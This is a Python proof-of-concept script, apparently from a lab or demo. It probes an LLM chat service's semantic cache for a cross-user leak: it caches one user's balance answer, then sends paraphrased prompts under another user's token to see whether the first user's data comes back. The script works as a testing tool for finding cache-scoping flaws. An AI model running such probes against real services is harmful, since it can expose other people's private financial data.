"""Cross-user leak through the semantic cache.

Caches Papa-Figo's balance, then sends six prompts using Chico's token.
Exit: 0 = leak detected, 1 = no leak detected.
"""
import sys
import time

import httpx

import paint

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000"
VICTIM = {"Authorization": "Bearer token-papafigo"}
ATTACKER = {"Authorization": "Bearer token-chico"}

VICTIM_PROMPT = "What is my account balance?"
ATTACKER_PROMPTS = [
    "what is my account balance",                    # capitalization and punctuation variation
    "show me my balance",                            # paraphrase
    "how much money do I have in my account?",       # paraphrase without the word 'balance'
    "what is Papa-Figo's account balance?",          # explicit name of the victim
    "what is Chico do Pentest's account balance?",   # attacker's own name
    "what is my registered address?",                # different intent (control)
]


def ask(client: httpx.Client, who: dict, prompt: str):
    t0 = time.perf_counter()
    r = client.post(f"{BASE}/chat", json={"prompt": prompt}, headers=who)
    dt = (time.perf_counter() - t0) * 1000
    r.raise_for_status()
    return r.json()["answer"], r.headers.get("X-Cache", "?"), r.headers.get("X-Cache-Sim", "?"), dt


def main():
    leaks = 0
    with httpx.Client(timeout=60) as c:
        cfg = c.post(f"{BASE}/admin/reset").json()
        print(f"[cfg] scope={cfg['scope']} threshold={cfg['threshold']}\n")

        ans, st, sim, dt = ask(c, VICTIM, VICTIM_PROMPT)
        print(f"{paint.victim('[papa-figo]')} {VICTIM_PROMPT!r}\n"
              f"            -> {st} {dt:6.0f}ms  {paint.victim(ans)}\n")

        for p in ATTACKER_PROMPTS:
            ans, st, sim, dt = ask(c, ATTACKER, p)
            leaked = "Papa-Figo" in ans
            leaks += leaked
            tag = paint.leak("LEAK") + " " if leaked else "ok   "
            shown = paint.leak(ans) if leaked else paint.attacker(ans) if "Chico" in ans else ans
            print(f"{paint.attacker('[chico]    ')} {tag} sim={sim} {st:4} {dt:6.0f}ms  {p!r}\n"
                  f"            -> {shown}")

    if leaks:
        print(paint.bad(f"\n[+] VULNERABLE: authenticated as Chico do Pentest, {leaks}/{len(ATTACKER_PROMPTS)} "
                        f"prompts returned Papa-Figo's cached answer"))
        return 0
    print(paint.good("\n[-] NOT VULNERABLE: no tested prompt returned Papa-Figo's data "
                     "(cache key includes the user)"))
    return 1


if __name__ == "__main__":
    sys.exit(main())
